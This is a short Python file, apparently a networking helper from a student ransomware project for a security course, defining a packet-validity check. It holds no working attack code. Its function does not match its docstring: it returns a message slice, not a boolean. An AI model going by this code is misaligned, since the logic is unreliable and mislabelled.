# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import sys
# --------------------------------------------
# Functions
# --------------------------------------------


def check_packet_validity(header, message):
    """
    Protocole servant à contrôler la validité d'un packet en fonction de la taille de son header
    :param header: packet's header
    :type header: str
    :param message: packet's message
    :type message: str
    :return: True if packet is valid or False if not
    :rtype: bool
    """
    return message[9:9+header]

